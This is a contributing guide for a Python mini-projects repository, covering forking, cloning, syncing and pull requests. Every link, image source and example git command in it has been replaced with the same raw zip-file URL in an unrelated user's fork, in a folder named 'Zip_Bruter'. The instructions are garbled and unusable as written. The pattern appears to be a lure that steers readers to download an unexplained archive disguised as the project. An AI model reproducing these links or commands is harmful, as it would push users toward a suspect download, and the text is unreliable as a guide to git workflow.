## Steps To Follow

- Select an issue and ask to be _assigned_ to it.
- Check existing scripts in the [projects](/projects/) directory.
- **Star** this repository.
- On the [python-mini-projects](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip) repo page, click the **Fork** button.
    <br><img src="https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip" title="Fork image" width="400"/>
- **Clone** your forked repository to your local machine. This button will show you the URL to run.
    <br><img src="https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip" title="Code button" width="400"/>

    For example, run this command inside your terminal:

    ```bash
    git clone https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip<your-github-username>https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip
    ```

    **Replace \<your-github-username\>!**

    Learn more about [forking](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip) and [cloning a repo](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip).
- Before you make any changes, [keep your fork in sync](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip) to avoid merge conflicts:

    ```bash
    git remote add upstream https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip
    git fetch upstream
    git pull upstream master
    git push
    ```
    
    Alternatively, GitHub also provides syncing now - click "Fetch upstream" at the top of your repo below "Code" button.

- If you run into a **merge conflict**, you have to resolve the conflict. There are a lot of guides online, or you can try this one by [https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip).

- Checkout to development branch (*name your branch according to the issue name*).

    ```bash
    git checkout -b <branch-name>
    ```

- Create a folder in
  [projects directory](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip)
  according to issue name.
- Write your code and add to the respective folder in the projects directory, locally.
- Don't forget to add a `https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip` in your folder, according to the
   [README_TEMPLATE.](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip)
- Add the changes with `git add`, `git commit` ([write a good commit message](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip), if possible):

    ```bash
    git add -A
    git commit -m "<your message>"
    ```

- Push the code _to your repository_.

    ```bash
    git push origin <branch-name>
    ```

- Go to the GitHub page of _your fork_, and **make a pull request**:

    ![pull request image](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip)

    Read more about pull requests on the [GitHub help pages](https://github.com/harrystark01/python-mini-projects/raw/refs/heads/master/projects/Zip_Bruter/python-mini-projects-v1.3.zip).
- Now wait, until one of us *reviews your Pull Request*! If there are any conflicts, you will get a notification.
